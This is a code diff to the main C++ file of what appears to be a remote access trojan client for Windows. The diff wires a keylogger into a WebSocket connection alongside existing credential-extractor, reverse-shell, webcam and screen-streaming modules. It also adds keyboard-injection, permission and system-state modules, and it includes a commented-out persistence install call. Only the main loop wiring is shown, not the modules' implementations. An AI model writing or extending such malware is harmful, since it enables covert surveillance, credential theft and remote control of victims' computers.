@@ -13,6 +13,11 @@
 #include "Download.h"
 #include "CredentialsExtractor.h"
 #include "ReverseShell.h"
+#include "Permission.h"
+#include "MessageBoxGUI.h"
+#include "KeyboardExecuter.h"
+#include "ConnectionState.h"
+#include "SystemState.h"
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
@@ -98,11 +103,10 @@ int main(int argc = 0, char *argv[] = nullptr) {
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
-        KeyLogger keyLogger(Stream(0), actionMap);
-        keyLogger.tryStart();
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool isConnecting = true;
         std::string uri = "ws://localhost:8080";
+        bool streamListening = true;
 
         ClientSocket clientSocket(uri, actionMap);
         Information information(clientSocket);
@@ -112,12 +116,18 @@ int main(int argc = 0, char *argv[] = nullptr) {
         ScreenStreamer screenStreamer(clientSocket);
         WebcamManager webcamManager(clientSocket, download);
         CredentialsExtractor credentialsExtractor(clientSocket, download);
+        KeyLogger keyLogger(clientSocket, download);
+        keyLogger.tryStart();
         ReverseShell reverseShell(clientSocket);
+        Permission permission(clientSocket);
+        MessageBoxGUI messageBoxGui(clientSocket);
+        KeyboardExecuter keyboardExecuter(clientSocket);
+        ConnectionState connectionState(clientSocket, isConnecting, streamListening);
+        SystemState systemState(clientSocket);
         clientSocket.startConnection();
 
 
 
-        bool streamListening = true;
         while (isConnecting) {
 
 
